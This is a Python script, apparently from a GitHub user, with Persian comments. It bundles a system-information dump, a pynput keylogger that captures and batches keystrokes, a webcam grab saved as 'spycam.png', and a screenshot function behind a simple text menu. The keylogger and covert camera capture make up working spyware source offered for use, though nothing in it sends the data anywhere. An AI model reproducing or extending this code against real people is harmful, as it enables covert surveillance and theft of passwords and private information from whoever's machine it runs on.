
# may-313
#https://github.com/may-313



# -------------------------اطلاعات سیستم----------------------------
def info_system():
    import  psutil
    import platform
    print(f"""
    --- اطلاعات سیستم ---
    سیستم‌عامل: {platform.system()}
    CPU:
        تعداد هسته‌ها: {psutil.cpu_count(logical=True)}
        درصد استفاده: {psutil.cpu_percent(interval=1)}%
    RAM:
        کل: {psutil.virtual_memory().total / (1024**3):.2f} GB
        در دسترس: {psutil.virtual_memory().available / (1024**3):.2f} GB
    دیسک (/):
        کل: {psutil.disk_usage('/').total / (1024**3):.2f} GB
        استفاده شده: {psutil.disk_usage('/').used / (1024**3):.2f} GB
        آزاد: {psutil.disk_usage('/').free / (1024**3):.2f} GB
        درصد استفاده: {psutil.disk_usage('/').percent}%
    شبکه:
        ارسال شده: {psutil.net_io_counters().bytes_sent / (1024**2):.2f} MB
        دریافت شده: {psutil.net_io_counters().bytes_recv / (1024**2):.2f} MB
    باتری:
        وضعیت: {f"{psutil.sensors_battery().percent}% {'در حال شارژ' if psutil.sensors_battery().power_plugged else 'غیر فعال'}" if psutil.sensors_battery() else "باتری ندارد"}
    """)



# -----------------کی لاگر-------------
# pip install pynput
from pynput.keyboard import Listener
def keylogger():
    print("‼️run keylogger‼️")
    List_Key = []

    SpecialـKeys= {"Key.tab":"[Tab]",'Key.caps_lock':'[Capslk]','Key.shift':'[lShift]','Key.ctrl':'[lCtrl]','Key.alt':'[lAlt]','Key.cmd':'[Win]','Key.alt_r':'[rAlt]','Key.enter':'[Enter]',
                'Key.shift_r':'[rShift]','Key.up':'[Up]','Key.down':'[down]','Key.right':'[right]', 'Key.left':'[left]','Key.space':'[Space]','Key.esc':'[Esc]','Key.backspace':'[Backspace]'}


    def On_Press (key):
        listen = str(key).replace("'", "")


        if SpecialـKeys.get(listen):
            listen = SpecialـKeys[listen]

        List_Key.append(listen)

        if len(List_Key) == 20:
            print(List_Key)
            List_Key.clear()

    with Listener (on_press=On_Press,on_release=None) as listens:
        listens.join()

# ----------------------وب کم---------------------
# pip install opencv-python
def webcam():
    import cv2
    camera = cv2.VideoCapture(0)
    ret, frame = camera.read()
    if ret:
         cv2.imwrite("spycam.png", frame)

    camera.release()
    cv2.destroyAllWindows()

# ----------------------اسکرین شات---------------------
# pip install pyautogui
def screen():
    import pyautogui
    my_screenshot = pyautogui.screenshot()
    my_screenshot.save("screenshot.png")

while True:
    print("1-photo from webcam\n2-screenshot\n3-info system\n 4-keyloger")
    choice= (input("enter your choice:"))
    if choice == "1":
        webcam()
        print("عکس گرفته شد!!!!")
    elif choice == "2" :
        screen()
        print("اسکرین شات گرفته شد!!")
    elif choice=="3":
        info_system()
    elif choice == "4" :
        keylogger()
    else:
        print("---EXIT---")
        break
